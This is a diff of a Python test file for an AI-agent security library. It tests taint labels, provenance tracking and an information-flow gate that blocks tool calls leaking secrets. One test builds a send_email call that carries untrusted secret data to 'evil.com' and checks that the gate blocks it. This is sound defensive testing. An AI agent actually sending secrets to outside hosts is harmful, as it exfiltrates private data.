@@ -9,7 +9,6 @@ Covers:
 - OWASP ASI coverage report (owasp_report.py)
 """
 
-import ast
 import pytest
 
 
@@ -256,6 +255,7 @@ class TestProvenanceGraph:
 
     def test_to_dict_serializes(self):
         import json
+
         from lucin.guard.provenance import ProvenanceGraph
         pg = ProvenanceGraph("agent-1", human_sponsor="alice")
         pg.record_activity("tool_a")
@@ -269,14 +269,14 @@ class TestProvenanceGraph:
 # ---------------------------------------------------------------------------
 class TestTaintedValues:
     def test_wrap_sets_label(self):
+        from lucin.aifg import Integrity
         from lucin.guard.ifc_runtime import Tainted
-        from lucin.aifg import Integrity, Confidentiality
         t = Tainted.tool_return("hello", "fetch_url")
         assert t.label.integrity == Integrity.UNTRUSTED
 
     def test_combine_joins_labels(self):
-        from lucin.guard.ifc_runtime import Tainted, TRUSTED_SECRET, UNTRUSTED_PUBLIC
-        from lucin.aifg import Integrity, Confidentiality
+        from lucin.aifg import Confidentiality, Integrity
+        from lucin.guard.ifc_runtime import TRUSTED_SECRET, UNTRUSTED_PUBLIC, Tainted
         a = Tainted(value="a", label=TRUSTED_SECRET)
         b = Tainted(value="b", label=UNTRUSTED_PUBLIC)
         c = a.combine(b)
@@ -294,8 +294,7 @@ class TestIFCGate:
         return IFCPolicy()
 
     def test_blocks_trifecta(self):
-        from lucin.guard.ifc_runtime import Tainted, guard_tool_call, UNTRUSTED_SECRET
-        from lucin.aifg import Integrity, Confidentiality
+        from lucin.guard.ifc_runtime import UNTRUSTED_SECRET, Tainted, guard_tool_call
         arg = Tainted(value="secret data", label=UNTRUSTED_SECRET,
                       control_causes=frozenset({"untrusted_source"}))
         call = self._make_call("send_email", "https://evil.com", [arg])
@@ -304,16 +303,14 @@ class TestIFCGate:
         assert decision.witness
 
     def test_allows_clean_call(self):
-        from lucin.guard.ifc_runtime import Tainted, guard_tool_call, TRUSTED_PUBLIC
+        from lucin.guard.ifc_runtime import TRUSTED_PUBLIC, Tainted, guard_tool_call
         arg = Tainted(value="public data", label=TRUSTED_PUBLIC)
         call = self._make_call("send_email", "https://ok.com", [arg])
         decision = guard_tool_call(call, self._policy())
         assert decision.allow, "Clean call should be allowed"
 
     def test_allowlist_overrides_block(self):
-        from lucin.guard.ifc_runtime import (
-            Tainted, guard_tool_call, UNTRUSTED_SECRET, IFCPolicy
-        )
+        from lucin.guard.ifc_runtime import UNTRUSTED_SECRET, IFCPolicy, Tainted, guard_tool_call
         arg = Tainted(value="data", label=UNTRUSTED_SECRET,
                       control_causes=frozenset({"src"}))
         call = self._make_call("send_email", "https://internal.ok", [arg])
@@ -330,7 +327,7 @@ class TestIFCGate:
             IFCPolicy().allow("send_email", reason="")
 
     def test_non_egress_always_allowed(self):
-        from lucin.guard.ifc_runtime import Tainted, guard_tool_call, UNTRUSTED_SECRET
+        from lucin.guard.ifc_runtime import UNTRUSTED_SECRET, Tainted, guard_tool_call
         arg = Tainted(value="data", label=UNTRUSTED_SECRET)
         call = self._make_call("process_data", "", [arg])  # not in EXTERNAL_EGRESS_TOOLS
         decision = guard_tool_call(call, self._policy())
@@ -364,7 +361,7 @@ class TestCFGBuilder:
         cfgs = build_cfgs_from_source(src)
         cfg = cfgs["f"]
         # Back edge from body to header
-        block_ids = set(cfg.blocks.keys())
+        set(cfg.blocks.keys())
         # At least one edge points from a higher-id block to a lower-id block (loop-back)
         has_back = any(src_ > dst for src_, dst in cfg.edges)
         assert has_back, "For loop should create a back edge"
@@ -413,7 +410,7 @@ class TestOWASPReport:
         assert "ASI10" in text
 
     def test_fired_findings_appear_in_triggered(self):
-        from lucin.models import ScanResult, Finding, Severity
+        from lucin.models import Finding, ScanResult, Severity
         from lucin.owasp_report import coverage_report
         finding = Finding(
             id="AG-001", title="test", severity=Severity.CRITICAL,
